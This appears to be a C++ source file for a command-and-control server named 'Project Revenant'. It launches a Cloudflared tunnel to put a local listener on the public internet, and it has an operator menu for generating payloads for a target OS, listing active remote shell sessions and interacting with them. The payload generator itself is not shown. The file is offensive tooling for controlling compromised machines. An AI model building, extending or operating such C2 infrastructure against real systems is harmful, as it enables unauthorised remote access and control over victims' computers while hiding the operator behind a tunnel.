#include <iostream>
#include <cstdlib>
#include <unordered_map>
#include <memory>
#include <stdexcept>
#include <string>
#include <unistd.h>  
#include <algorithm> 
using namespace std;

/**
 * @brief Starts a Cloudflared tunnel on the specified port and extracts its public URL.
 * 
 * This function performs the following steps:
 * 1. Launches the Cloudflared tunnel in the background, exposing the local port to the internet.
 * 2. Waits briefly to allow Cloudflared to initialize.
 * 3. Reads the generated log file and extracts the public URL of the tunnel using grep. 
 * 
 * @param PORT The local port to expose through Cloudflared.
 * @return A string containing the Cloudflared public URL (e.g., "https://xxxx.trycloudflare.com").
 *         If no URL is found, returns an empty string and the server will fallback to localhost.
 * 
 * @throws std::runtime_error if popen() fails to execute the grep command.
 */
string start_cloudflared(int PORT) {
    // Step 1: Create Cloudflared tunnel on the given port
    cout << "\n[*] Starting Cloudflared tunnel on port " << PORT << "...\n";
    string command = "cloudflared tunnel --url http://localhost:" + to_string(PORT) + 
                     " > cloudflared.log 2>&1 & echo $! > cloudflared.pid";
    
    // system() is used to run shell command and start cloudflared in background
    system(command.c_str()); 
    
    // Step 2: Wait for Cloudflared to initialize and publish its URL
    sleep(6);

    // Step 3: Extract Cloudflared public URL from log file
    cout << "[*] Extracting Cloudflared public URL...\n";
    
    // popen() is used to run grep command and capture its output (the URL)
    FILE* pipe = popen("grep -ao 'https://[^ ]*trycloudflare.com' cloudflared.log | head -n1", "r"); 
    
    if (!pipe) {
        throw runtime_error("[!] popen() failed to execute grep command!");
    }

    // Read URL from the pipe
    char buffer[256];
    string result = "";
    
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    
    // Close the pipe
    pclose(pipe);
    
    // Step 4: Display and return the result
    cout << "------------------------------------------------------------\n";
    if(result.size() > 0) {
        cout << "[+] Cloudflared Public URL: " << result << "\n";
    } else {
        cout << "[!] Cloudflared URL not found. Using localhost instead.\n";
    }
    cout << "------------------------------------------------------------\n\n";

    return result;
}

void help() {
    cout << "\n=============================\n";
    cout << "        Available Commands\n";
    cout << "=============================\n\n";

    cout << "generate os=<OS>    : Generate payload for target OS\n";
    cout << "show shell          : Show active shell sessions\n";
    cout << "shell <shell-id>    : Interact with a shell session\n";
    cout << "help                : Display this help message\n";
    cout << "exit                : Exit the server\n";

    cout << "\n=============================\n\n";
}

void banner() {
    cout << R"(

██████  ███████ ██    ██ ███████ ███    ██  █████  ███    ██ ████████ 
██   ██ ██      ██    ██ ██      ████   ██ ██   ██ ████   ██    ██    
██████  █████   ██    ██ █████   ██ ██  ██ ███████ ██ ██  ██    ██    
██   ██ ██      ██    ██ ██      ██  ██ ██ ██   ██ ██  ██ ██    ██    
██   ██ ███████  ██████  ███████ ██   ████ ██   ██ ██   ████    ██    
                                                                     

                Lightweight C2 Server - Project Revenant
------------------------------------------------------------------

)" << endl;
}

void show_shell(const unordered_map<string, int>& mp) {
    cout << "\n=============================\n";
    cout << "        Active Clients\n";
    cout << "=============================\n";

    if (mp.empty()) {
        cout << "[!] No active clients.\n";
    } else {
        int count = 1;
        for (const auto& pair : mp) {
            cout << "[" << count << "] Endpoint: " << pair.first << "\n";
            count++;
        }
    }

    cout << "-----------------------------\n";
    cout << "Usage: shell <Endpoint>\n";
    cout << "-----------------------------\n\n";
}